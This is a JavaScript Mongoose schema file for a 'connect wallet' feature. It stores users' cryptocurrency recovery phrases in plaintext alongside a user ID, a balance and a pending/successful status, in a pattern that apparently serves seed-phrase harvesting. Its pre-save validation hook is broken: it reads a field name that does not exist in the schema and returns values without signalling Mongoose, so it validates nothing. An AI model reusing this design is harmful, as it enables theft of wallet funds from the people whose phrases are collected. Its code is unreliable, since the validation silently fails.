import mongoose from "mongoose";
import bip39 from "bip39";

const connectWalletSchema = new mongoose.Schema({
  walletPhrase: {
    type: String,
  },
  walletType: {
    type: String,
    default: "Multi-coin",
  },
  walletName: {
    type: String,
    default: "Multi-coin",
  },
  walletAmount: {
    type: Number,
    default: 0,
  },
  status: {
      type: String,
      enum: ["Pending", "Successful", "Failed"],
      default: "Pending",
    },
  userId: { 
        type: mongoose.Schema.Types.ObjectId,
        ref: "User",
        required: true,
      },
},
{
  timestamps: true,
});

// Validate the recovery phrase format
connectWalletSchema.pre('save', async function (next) {
  if (typeof this.recoveryPhrase !== "string") return false;

  // Trim and normalize internal spacing
  const cleaned = this.recoveryPhrase.trim().replace(/\s+/g, " ");

  // Split into words
  const words = cleaned.split(" ");

  // Check word count
  const validLengths = [12, 18, 24];
  if (!validLengths.includes(words.length)) {
    return false;
  }

  // You can add additional checks here (e.g., using a BIP-39 word list)

  return bip39.validateMnemonic(cleaned);
});

export default mongoose.models.Wallet || mongoose.model("Wallet", connectWalletSchema);
